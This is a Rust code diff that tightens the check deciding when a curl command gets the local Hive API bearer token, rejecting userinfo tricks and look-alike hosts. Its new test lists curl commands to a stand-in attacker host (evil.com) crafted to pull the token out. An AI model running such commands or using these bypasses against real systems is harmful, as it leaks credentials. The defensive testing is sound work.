@@ -205,8 +205,59 @@ const PROMPT_AUTH_HEADER: &str = "-H \"Authorization: Bearer $HIVE_API_TOKEN\"";
 
 const PROMPT_AUTH_GUIDANCE: &str = "\nEvery Hive API request must send `Authorization: Bearer $HIVE_API_TOKEN` from your process environment (PowerShell: `$env:HIVE_API_TOKEN`); a request without it gets 401. Add the header to any API call you compose yourself. Never print the token, use verbose curl, or write its value to a file.\n";
 
-fn targets_local_api(block: &str) -> bool {
-    (block.contains("localhost:") || block.contains("127.0.0.1:")) && block.contains("/api/")
+/// Every `http://` / `https://` URL in a curl invocation's segment, each cut at
+/// the first character that cannot be part of an unquoted shell URL.
+fn segment_urls(segment: &str) -> Vec<&str> {
+    let mut urls = Vec::new();
+    let mut search = 0;
+    while let Some(found) = segment[search..].find("http") {
+        let start = search + found;
+        let rest = &segment[start..];
+        let after_scheme = if rest.starts_with("http://") {
+            7
+        } else if rest.starts_with("https://") {
+            8
+        } else {
+            search = start + 4;
+            continue;
+        };
+        let length = rest[after_scheme..]
+            .find(|ch: char| ch.is_whitespace() || matches!(ch, '"' | '\'' | '`' | ')' | '|' | ';' | '&' | '<' | '>'))
+            .map_or(rest.len(), |end| after_scheme + end);
+        urls.push(&rest[..length]);
+        search = start + length.max(after_scheme);
+    }
+    urls
+}
+
+/// A URL is the local Hive API only when its parsed authority is a loopback host
+/// with an explicit numeric port and its path starts with `/api/`. Userinfo
+/// (`localhost:1@evil.com`), look-alike hosts and loopback text inside an
+/// external URL's path or query never qualify.
+fn is_local_api_url(url: &str) -> bool {
+    let Some(rest) = url.strip_prefix("http://").or_else(|| url.strip_prefix("https://")) else {
+        return false;
+    };
+    let authority_end = rest.find(['/', '?', '#']).unwrap_or(rest.len());
+    let (authority, path) = rest.split_at(authority_end);
+    if authority.contains('@') {
+        return false;
+    }
+    let Some((host, port)) = authority.rsplit_once(':') else {
+        return false;
+    };
+    matches!(host, "localhost" | "127.0.0.1")
+        && !port.is_empty()
+        && port.bytes().all(|byte| byte.is_ascii_digit())
+        && path.starts_with("/api/")
+}
+
+/// An invocation gets the token only if it requests at least one URL and every
+/// URL it requests is the local API; any external URL in the same invocation
+/// fails closed (no header, so the local call gets an explicit 401).
+fn targets_local_api(segment: &str) -> bool {
+    let urls = segment_urls(segment);
+    !urls.is_empty() && urls.iter().all(|url| is_local_api_url(url))
 }
 
 /// Byte offsets just past each `curl`/`curl.exe` executable token in a line.
@@ -427,6 +478,24 @@ curl -s https://example.com/a \\\n  -o out && curl -s \\\n  http://127.0.0.1:188
         let listing = String::from_utf8_lossy(&output.stdout);
         assert!(listing.contains("OWNER RIGHTS"), "{listing}");
         assert!(!listing.contains("(I)"), "{listing}");
+    }
+
+    #[test]
+    fn loopback_text_inside_an_external_url_never_gets_the_token() {
+        for source in [
+            "curl -s \"https://evil.com/?u=127.0.0.1:18800/api/\"",
+            "curl -s https://evil.com/127.0.0.1:18800/api/sessions",
+            "curl -s \"https://example.com/collect?next=http://localhost:18800/api/sessions\"",
+            "curl -s http://localhost:18800@evil.com/api/sessions",
+            "curl -s http://localhost.evil.com:18800/api/sessions",
+            "curl -s http://localhost:18800/api/a https://evil.com/b",
+        ] {
+            assert_eq!(authorize_api_commands(source), source, "{source}");
+        }
+        assert!(is_local_api_url("http://127.0.0.1:18800/api/sessions"));
+        assert!(is_local_api_url("http://localhost:41234/api/x?y=1"));
+        assert!(!is_local_api_url("http://localhost/api/x"));
+        assert!(!is_local_api_url("http://localhost:18800/health"));
     }
 
     #[test]
